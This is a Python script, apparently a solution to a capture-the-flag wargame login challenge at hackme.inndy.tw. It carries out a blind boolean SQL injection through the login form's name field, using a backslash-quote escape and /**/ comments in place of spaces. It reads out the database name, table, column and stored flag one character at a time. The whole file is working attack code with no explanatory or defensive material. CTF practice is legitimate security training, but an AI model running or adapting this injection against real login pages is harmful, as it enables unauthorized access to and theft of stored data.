import requests, string, urllib

s = requests.session()

url = "https://hackme.inndy.tw/login1/"

chars = string.printable

length = 0
print_debug=False

color_dark = '\x1b[1;30;40m'
color_light = '\x1b[1;32;40m'
color_end = '\x1b[0m'

def print_debug_msg(msg):
    if print_debug:
        print(color_dark + msg + color_end)

def print_msg(msg):
    print(color_light + msg + color_end)

# Find the length of database name
for i in range(20):
    payload = "1\\' OR (select length(database()))=%s#".replace(' ', '/**/') %i
    print_debug_msg(payload)
    _data = {
        'name' : payload,
        'password' : "abc"
    }

    r = s.post(url, data=_data)
    
    if "Hi, " in r.text:
        length = i
        print_msg("length of current-db name is : " + str(length))
        break

# Find the database name
current_db = ""

for i in range(1, length+1):
    for j in chars:
        payload = "1\\' OR (select substring(database(), %s, 1))=\"%s\"#".replace(' ', '/**/') % (i, j)
        print_debug_msg(payload)
        _data = {
            'name' : payload,
            'password' : "123"
        }

        r = s.post(url, data=_data)

        if "Hi, " in r.text:
            current_db += j
            break

print_msg("current-db name is : " + current_db)

# Find the length of first table name in the database
for i in range(2048):
    payload = "1\\' OR (select length(concat(TABLE_NAME)) from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA=\"%s\" limit 1)=%s#".replace(' ', '/**/') %(current_db, i)
    
    _data = {
        'name' : payload,
        'password' : "123"
    }

    r = s.post(url, data=_data)
    print_debug_msg(payload)
    if "Hi, " in r.text:
        length = i
        print_msg("length of table name is : " + str(length))
        break


# Find the first table name in the database
tableName = ""

for i in range(1, length+1):
    for j in chars:
        payload = "1\\' OR (select substring(concat(table_name), %s, 1) from information_schema.tables where table_schema=\"%s\" limit 1)=\"%s\"#".replace(' ', '/**/') %(i, current_db, j)
        print_debug_msg(payload)
        _data = {
            'name' : payload,
            'password' : "123"
        }

        r = s.post(url, data=_data)

        if "Hi, " in r.text:
            tableName += j
            break

print_msg("table name is : " + tableName)

# Find the amount of column of this table
count = 0

for i in range(60):
    payload = "1\\' OR (select count(*) from information_schema.columns where table_schema=\"%s\" and table_name=\"%s\")=%s#".replace(' ', '/**/') % (current_db, tableName, i)

    _data = {
        'name' : payload,
        'password' : "123"
    }

    r = s.post(url, data=_data)
    print_debug_msg(payload)
    if "Hi, " in r.text:
        count = i
        print_msg("amount of columns is : " + str(count))
        break

# Find the length of second column name
for i in range(64):
    payload = "1\\' OR (select length(concat(COLUMN_NAME)) from INFORMATION_SCHEMA.COLUMNS where TABLE_SCHEMA=\"%s\" and table_name=\"%s\" limit 1 offset 1)=%s#".replace(' ', '/**/') % (current_db, tableName, i)
    
    _data = {
        'name' : payload,
        'password' : "123"
    }

    r = s.post(url, data=_data)
    print_debug_msg(payload)
    if "Hi, " in r.text:
        length = i
        print_msg("length of column name is : " + str(length))
        break

# Find the second column name
columnName = ""

for i in range(1, length+1):
    for j in chars:
        payload = "1\\' OR (select substring(concat(column_name), %s, 1) from information_schema.columns where table_schema=\"%s\" and table_name=\"%s\" limit 1 offset 1)=\"%s\"#".replace(' ', '/**/') % (i, current_db, tableName, j)
        print_debug_msg(payload)
        _data = {
            'name' : payload,
            'password' : "123"
        }

        r = s.post(url, data=_data)

        if "Hi, " in r.text:
            columnName += j
            break

print_msg("column name is : " + columnName)

# Find the length of value at columnName of first record in the table
for i in range(128):
    payload = "1\\' OR (select length(%s) from %s.%s limit 1)=%s#".replace(' ', '/**/') %(columnName, current_db, tableName, i)
    
    _data = {
        'name' : payload,
        'password' : "123"
    }

    r = s.post(url, data=_data)
    print_debug_msg(payload)
    if "Hi, " in r.text:
        length = i
        print_msg("length of flag is : " + str(length))
        break

# Find the value at columnName of first record in the table
flag = ""
		
for i in range(1, length+1):
    for j in chars:
        payload = "1\\' OR (select substring(concat(%s), %s, 1) from %s.%s limit 1)=\"%s\"#" %(columnName, i, current_db, tableName, j)
        payload = payload.replace(' ', '/**/')

        _data = {
            'name' : payload,
            'password' : "123"
        }

        r = s.post(url, data=_data)
        print_debug_msg(payload)
        if "Hi, " in r.text or j == " ":
            flag += j
            break

print_msg("flag is : " + flag)



